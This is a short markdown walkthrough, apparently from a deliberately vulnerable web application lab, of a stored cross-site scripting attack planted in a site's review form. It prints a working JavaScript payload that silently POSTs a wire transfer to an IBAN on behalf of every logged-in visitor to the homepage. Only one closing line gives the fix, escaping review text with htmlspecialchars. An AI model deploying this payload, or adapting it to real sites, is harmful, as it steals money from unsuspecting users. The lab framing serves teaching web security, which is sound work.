# Transfer funds to your account

This attack will exploit the reviews to transfer to you bank account an amount of money for each registered user that visits the homepage.

## Steps

- Register an user on the website and login
- Create a review and inject malicious javascript code 

    ```javascript
    <script>
        fetch('/wire-transfer.php', {
            method:'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: 'iban=US1523100000054000784030479&amount=1&notes='
        })
    </script>
    ```
    
- Every time a logged in user visits the homepage, a dollar is transfered to your account

## Mitigation

Wrap the received message text in [htmlspecialchars()](https://www.php.net/manual/en/function.htmlspecialchars.php) function
